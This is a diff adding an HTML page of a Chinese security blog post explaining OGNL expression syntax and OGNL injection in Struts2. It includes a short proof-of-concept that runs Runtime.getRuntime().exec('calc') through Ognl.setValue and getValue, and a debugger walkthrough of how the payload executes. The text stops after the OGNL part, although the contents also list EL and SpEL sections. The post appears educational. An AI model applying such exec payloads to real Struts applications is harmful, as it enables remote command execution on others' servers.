@@ -1,0 +1,411 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>OGNL_EL_Spel表达式 | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="OGNL基础OGNL表达式的作用 支持对象方法的调用 ObjectName.methodName() 静态方法的调用和值得访问 @java.lang.String@format(&#39;aa%s&#39;, &#39;RoboTerh&#39;), 这里的包名必须要是完整的包名，不能只使用String 支持变量赋值操作和表达式串联 访问OGNL上下文，和ActionContext 直接new创建">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OGNL_EL_Spel表达式">
+<meta property="og:url" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/index.html">
+<meta property="og:site_name" content="RoboTerh">
+<meta property="og:description" content="OGNL基础OGNL表达式的作用 支持对象方法的调用 ObjectName.methodName() 静态方法的调用和值得访问 @java.lang.String@format(&#39;aa%s&#39;, &#39;RoboTerh&#39;), 这里的包名必须要是完整的包名，不能只使用String 支持变量赋值操作和表达式串联 访问OGNL上下文，和ActionContext 直接new创建">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407182022127.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407182531485.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407182811588.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407182916747.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407183115286.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407183219257.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407183430405.png">
+<meta property="article:published_time" content="2022-04-07T07:45:13.000Z">
+<meta property="article:modified_time" content="2022-04-09T08:37:53.923Z">
+<meta property="article:author" content="RoboTerh">
+<meta property="article:tag" content="表达式注入">
+<meta property="article:tag" content="OGNL">
+<meta property="article:tag" content="EL">
+<meta property="article:tag" content="SPEL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220407182022127.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">50</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">37</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#OGNL"><span class="toc-number">1.</span> <span class="toc-text">OGNL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">OGNL表达式的作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ActionContext"><span class="toc-number">1.1.2.</span> <span class="toc-text">ActionContext</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ValueStack"><span class="toc-number">1.1.3.</span> <span class="toc-text">ValueStack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%80%BC%E6%A0%88%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">获取值栈的方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E6%A0%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">对象树访问</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AF%B9%E5%8F%98%E9%87%8F%E7%9A%84%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">对变量的访问</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%EF%BC%8C%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">数组，对象</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8A%95%E5%BD%B1%E5%92%8C%E9%80%89%E6%8B%A9%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">投影和选择语法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">1.1.5.</span> <span class="toc-text"># % $</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E8%A7%A3%E6%9E%90OGNL%E7%9A%84api"><span class="toc-number">1.2.</span> <span class="toc-text">能解析OGNL的api</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E5%BC%8F%E5%88%86%E6%9E%90%E6%A0%88%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">调式分析栈调用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL"><span class="toc-number">2.</span> <span class="toc-text">EL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80-1"><span class="toc-number">2.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.1.2.</span> <span class="toc-text">隐式对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.3.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8java%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.4.</span> <span class="toc-text">调用java方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.1.5.</span> <span class="toc-text">禁用EL表达式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">2.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">2.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spel"><span class="toc-number">3.</span> <span class="toc-text">spel</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80-2"><span class="toc-number">3.1.</span> <span class="toc-text">基础</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">OGNL_EL_Spel表达式</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-04-07 15:45:13" itemprop="dateCreated datePublished" datetime="2022-04-07T15:45:13+08:00">2022-04-07</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-04-09 16:37:53" itemprop="dateModified" datetime="2022-04-09T16:37:53+08:00">2022-04-09</time></div><span class="leancloud_visitors" id="/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-flag-title="OGNL_EL_Spel表达式"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Java/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Java</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">表达式注入</span></a><a class="tag-item" href="/tags/OGNL/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">OGNL</span></a><a class="tag-item" href="/tags/EL/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">EL</span></a><a class="tag-item" href="/tags/SPEL/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">SPEL</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><h5 id="OGNL表达式的作用"><a href="#OGNL表达式的作用" class="headerlink" title="OGNL表达式的作用"></a>OGNL表达式的作用</h5><ul>
+<li>支持对象方法的调用 <code>ObjectName.methodName()</code></li>
+<li><strong>静态</strong>方法的调用和值得访问 <code>@java.lang.String@format(&#39;aa%s&#39;, &#39;RoboTerh&#39;)</code>, 这里的包名必须要是完整的包名，不能只使用<code>String</code></li>
+<li>支持变量赋值操作和表达式串联</li>
+<li>访问OGNL上下文，和ActionContext</li>
+<li>直接new创建一个对象</li>
+</ul>
+<h5 id="ActionContext"><a href="#ActionContext" class="headerlink" title="ActionContext"></a>ActionContext</h5><p>是一个上下文对象，对应OGNL的context</p>
+<p>除了三个常见的作用域<code>request</code>、<code>session</code>、<code>application</code>外，还有以下三个作用域：</p>
+<ul>
+<li>attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准；</li>
+<li>paramters：保存的是表单提交的参数；</li>
+<li>VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值</li>
+</ul>
+<h5 id="ValueStack"><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h5><p>是OGNL表达式存取数据的地方</p>
+<h6 id="获取值栈的方式"><a href="#获取值栈的方式" class="headerlink" title="获取值栈的方式"></a>获取值栈的方式</h6><ol>
+<li>在request作用域中获得值栈</li>
+</ol>
+<p>ValueStack对象在request范围内的存储方式为<code>request.setAttribute(&quot;struts.valueStack&quot;,valuestack)</code>，可以通过如下方式从request中取出值栈的信息。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取 ValueStack 对象，通过 request 对象获取</span>
+<span class="token class-name">ValueStack</span> valueStack <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ValueStack</span><span class="token punctuation">)</span><span class="token class-name">ServletActionContext</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token class-name">ServletActionContext</span><span class="token punctuation">.</span>STRUTS_VALUESTACK_KEY<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。</p>
+<ol start="2">
+<li>在ActionContext中获得值栈</li>
+</ol>
+<p>在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。</p>
+<p>ActionContext获取ValueStack对象的方式如下所示：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;通过 ActionContext 获取 valueStack 对象
+ValueStack valueStack &#x3D; ActionContext.getContext().getValueStack();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。</p>
+<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><h6 id="对象树访问"><a href="#对象树访问" class="headerlink" title="对象树访问"></a>对象树访问</h6><p>利用<code>.</code>进行连接</p>
+<h6 id="对变量的访问"><a href="#对变量的访问" class="headerlink" title="对变量的访问"></a>对变量的访问</h6><p>在前面加上<code>#</code></p>
+<h6 id="数组，对象"><a href="#数组，对象" class="headerlink" title="数组，对象"></a>数组，对象</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//例如</span>
+group<span class="token punctuation">.</span>users<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+#session<span class="token punctuation">[</span><span class="token string">'mysession'</span><span class="token punctuation">]</span>
+<span class="token comment">//构造list</span>
+<span class="token punctuation">&#123;</span><span class="token string">"green"</span><span class="token punctuation">,</span> <span class="token string">"red"</span><span class="token punctuation">,</span> <span class="token string">"blue"</span><span class="token punctuation">&#125;</span>
+<span class="token comment">//构造map</span>
+#<span class="token punctuation">&#123;</span><span class="token string">"key1"</span><span class="token operator">:</span><span class="token string">"value1"</span><span class="token punctuation">,</span> <span class="token string">"key2"</span><span class="token operator">:</span><span class="token string">"value2"</span><span class="token punctuation">&#125;</span>
+<span class="token comment">//新建对象</span>
+<span class="token keyword">new</span> <span class="token class-name">Java</span><span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="投影和选择语法"><a href="#投影和选择语法" class="headerlink" title="投影和选择语法"></a>投影和选择语法</h6><p>投影：</p>
+<p><code>group.users.&#123;username&#125;</code>获取group中所有users的username</p>
+<p>选择：</p>
+<p><code>collection.&#123;X YY&#125;</code>, <code>X</code>是一个选择操作符，YY是选择用的逻辑表达式</p>
+<p>选择操作符：</p>
+<ul>
+<li><code>?</code>选择满足条件的所有元素</li>
+<li><code>^</code>选择满足条件的第一个元素</li>
+<li><code>$</code>选择满足条件的最后一个元素</li>
+</ul>
+<h5 id=""><a href="#" class="headerlink" title="# % $"></a># % $</h5><ol>
+<li><code>#</code>符主要有三种用途：</li>
+</ol>
+<ul>
+<li>访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于<code>ActionContext.getContext()</code>；</li>
+<li>用于过滤和投影（projecting）集合，如<code>books.&#123;? #this.price&lt;100&#125;</code>；</li>
+<li>用于构造Map，如<code>#&#123;&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;&#125;</code>；</li>
+</ul>
+<ol start="2">
+<li>%符</li>
+</ol>
+<p><code>%</code>符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p>
+<ol start="3">
+<li>$符</li>
+</ol>
+<p><code>$</code>符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的</p>
+<h4 id="能解析OGNL的api"><a href="#能解析OGNL的api" class="headerlink" title="能解析OGNL的api"></a>能解析OGNL的api</h4><table>
+<thead>
+<tr>
+<th align="left">类名</th>
+<th align="left">方法名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">com.opensymphony.xwork2.util.TextParseUtil</td>
+<td align="left">translateVariables,translateVariablesCollection</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.TextParser</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.OgnlTextParser</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlUtil</td>
+<td align="left">setProperties,setProperty,setValue,getValue,callMethod,compile</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.util.VelocityStrutsUtil</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.util.StrutsUtil</td>
+<td align="left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.views.jsp.ui.OgnlTool</td>
+<td align="left">findValue</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.ValueStack</td>
+<td align="left">findString,findValue,setValue,setParameter</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlValueStack</td>
+<td align="left">findString,findValue,setValue,setParameter,trySetValue</td>
+</tr>
+<tr>
+<td align="left">ognl.Ognl</td>
+<td align="left">parseExpression,getValue,setValue</td>
+</tr>
+</tbody></table>
+<h4 id="表达式注入漏洞"><a href="#表达式注入漏洞" class="headerlink" title="表达式注入漏洞"></a>表达式注入漏洞</h4><p>如果我们能够控制ognl表达式，就可以达到恶意目的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">pers<span class="token punctuation">.</span>ognl</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">Ognl</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">OgnlContext</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">OgnlException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">OgnlException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">//创建一个上下文对象</span>
+        <span class="token class-name">OgnlContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OgnlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">//getValue触发漏洞</span>
+        <span class="token comment">//Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());</span>
+
+        <span class="token comment">//setValue触发漏洞</span>
+        <span class="token class-name">Ognl</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> context<span class="token punctuation">,</span> context<span class="token punctuation">.</span><span class="token function">getRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在上面的表格中，就提到过了，<code>Ognl.getValue, Ognl.setValue</code>都可以进行ognl表达式注入</p>
+<p>这里也成功弹出了计算器</p>
+<h5 id="调式分析栈调用"><a href="#调式分析栈调用" class="headerlink" title="调式分析栈调用"></a>调式分析栈调用</h5><p>首先在<code>getValue</code>方法前面打上断点</p>
+<p>在<code>getValue</code>方法中使用<code>parseExpression</code>来处理我们的表达式，跟进他</p>
+<p><img src="image-20220407182022127.png" alt="image-20220407182022127" loading="lazy"></p>
+<p>将其转化为了<code>ASTChain</code>类型的<code>tree</code></p>
+<p><img src="image-20220407182531485.png" alt="image-20220407182531485" loading="lazy"></p>
+<p>之后将转化为node类型的tree继续调用getValue方法</p>
+<p><img src="image-20220407182811588.png" alt="image-20220407182811588" loading="lazy"></p>
+<p><img src="image-20220407182916747.png" alt="image-20220407182916747" loading="lazy"></p>
+<p>这里的this，就是我们需要执行的恶意命令，我们调用evaluateGetValueBody方法来处理它，跟进</p>
+<p><img src="image-20220407183115286.png" alt="image-20220407183115286" loading="lazy"></p>
+<p>之后调用getValueBody来处理</p>
+<p><img src="image-20220407183219257.png" alt="image-20220407183219257" loading="lazy"></p>
+<p>在这里将他拆成了两部分</p>
+<p><img src="image-20220407183430405.png" alt="image-20220407183430405" loading="lazy"></p>
+<p>首先处理的是前半部分，<code>this._children[i]</code>就是前半部分，调用它的<code>SimpleNode#getValue</code>方法，并且将类名和方法名分割开了，这里的<code>result</code>就是<code>Runtime</code>类名</p>
+<p>之后就是通过反射进行获取类名，和方法名，进行执行</p>
